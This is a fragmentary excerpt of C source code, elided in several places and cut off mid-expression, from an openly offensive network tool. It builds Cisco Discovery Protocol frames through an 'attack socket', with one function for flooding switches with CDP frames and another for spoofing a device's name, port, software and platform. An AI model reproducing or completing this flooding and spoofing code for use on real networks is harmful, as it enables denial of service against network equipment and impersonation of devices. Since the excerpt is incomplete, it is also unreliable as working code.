...
/* globals */
uint8_t			CDP_DEST[6] = {0x1,0x0,0xC,0xCC,0xCC,0xCC};

int			atsock;		/* attack socket */
#define CDP_FRAME_SIZE	1700
uint8_t			cdpframe[CDP_FRAME_SIZE];
...
unsigned int	mk_flood_cdp(char *my_name,int nlen) {
    ...
    cdp_dev->length=htons(nlen+2*sizeof(uint16_t));
    memcpy(&(cdp_dev->device),my_name,nlen);

    /* make CDP port entry */
    cdp_prt=(struct cdp_port *)((void *)cdp_dev+(
	    sizeof(uint16_t) /* type */ + sizeof(uint16_t) /* length */ +
	    nlen));
    cdp_prt->type=htons(TYPE_PORT_ID);
    cdp_prt->length = htons((uint16_t)(strlen(my_portid) + 2*sizeof(uint16_t)));
    ...
    cs=chksum((uint8_t *)cdph,((void *)cdp_end-(void *)cdph));
    if (cfg.verbose>2) 
...
unsigned int	mk_spoof_cdp() {
    ...
    cdp_dev=(struct cdp_device *)((void *)cdph+sizeof(struct cdphdr));
    cdp_dev->type=htons(TYPE_DEVICE_ID);		/* 0x0001 */
    cdp_dev->length=htons(strlen(cfg.S_devname)+2*sizeof(uint16_t));
    ...
    cdp_prt->type=htons(TYPE_PORT_ID);
    cdp_prt->length=htons(strlen(cfg.S_portid)+2*sizeof(uint16_t));
    ...
    cdp_soft->length=htons(strlen(cfg.S_software)+2*sizeof(uint16_t));
    ...
    cdp_plt->length=htons(strlen(cfg.S_platform)+2*sizeof(uint16_t));
    memcpy(&(cdp_plt->platform),cfg.S_platform,strlen(cfg.S_platform));
    cdp_end=(uint8_t *)((void *)cdp_plt+(
	    sizeof(uint16_t) /* type */ + sizeof(uint16_t) /* length */ +
